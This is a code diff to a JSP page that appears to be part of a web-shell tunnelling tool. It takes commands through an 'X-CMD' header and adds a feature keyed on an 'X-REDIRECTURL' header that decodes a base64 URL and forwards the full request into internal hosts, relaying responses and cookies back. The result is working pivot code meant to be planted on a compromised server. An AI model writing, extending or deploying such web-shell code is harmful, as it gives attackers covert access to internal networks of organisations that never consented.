@@ -1,5 +1,12 @@
-<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.*, java.net.UnknownHostException, java.net.Socket"%>
+<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.*, java.net.UnknownHostException, java.net.*"%>
 <%
+    String rUrl = request.getHeader("X-REDIRECTURL");
+    if (rUrl != null) {
+        rUrl = new String(b64de(rUrl));
+        redirectRequest("X-REDIRECTURL", rUrl, request, response);
+        if ( true ) return; // exit
+    }
+
     response.setStatus(HTTPCODE);
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
@@ -166,5 +173,79 @@
         ServletOutputStream so = r.getOutputStream();
         so.write(bs, 0, bs.length);
         so.close();
+    }
+
+    private static void redirectRequest(String urlheader, String url, HttpServletRequest request, HttpServletResponse response) throws Exception {
+        ServletInputStream inputStream = request.getInputStream();
+        String method = request.getMethod();
+        URL u = new URL(url);
+        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
+        conn.setRequestMethod(method);
+        conn.setDoOutput(true);
+
+		// conn.setConnectTimeout(200);
+		// conn.setReadTimeout(200);
+
+        java.util.Enumeration enu=request.getHeaderNames();
+        while(enu.hasMoreElements()){
+            String key=(String)enu.nextElement();
+            if (!key.equalsIgnoreCase(urlheader)){
+                String value=request.getHeader(key);
+                conn.setRequestProperty(headerkey(key), value);
+            }
+        }
+
+        OutputStream output;
+        try{
+            output = conn.getOutputStream();
+        }catch(Exception e){
+            response.setHeader("X-ERROR", "Intranet forwarding failed");
+            return;
+        }
+
+        byte[] buffer = new byte[1024];
+        int i = 0;
+        while ((i = inputStream.read(buffer)) != -1) {
+            output.write(buffer, 0, i);
+        }
+        output.flush();
+        output.close();
+
+        for (String key : conn.getHeaderFields().keySet()) {
+            // Solve the jdk low version conn.getHeaderFields()
+            // Solve the problem of weblogic blank line cannot remove
+            if (key != null && !key.equalsIgnoreCase("Content-Length")){
+                String value = conn.getHeaderField(key);
+                response.setHeader(key, value);
+            }
+        }
+        if (conn.getHeaderFields().get("Set-Cookie") == null && request.getHeader("Cookie") != null)
+            response.setHeader("Set-Cookie", request.getHeader("Cookie"));
+
+        InputStream hin;
+        if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
+            hin = conn.getInputStream();
+        } else {
+            hin = conn.getErrorStream();
+        }
+
+        ServletOutputStream outputStream = response.getOutputStream();
+        response.setStatus(conn.getResponseCode());
+
+        while ((i = hin.read(buffer)) != -1) {
+            outputStream.write(buffer, 0, i);
+        }
+
+        outputStream.flush();
+        outputStream.close();
+    }
+
+    static String headerkey(String str) throws Exception {
+        String out = "";
+        for (String block: str.split("-")) {
+           out += block.substring(0, 1).toUpperCase() + block.substring(1);
+           out += "-";
+        }
+        return out.substring(0, out.length() - 1);
     }
 %>
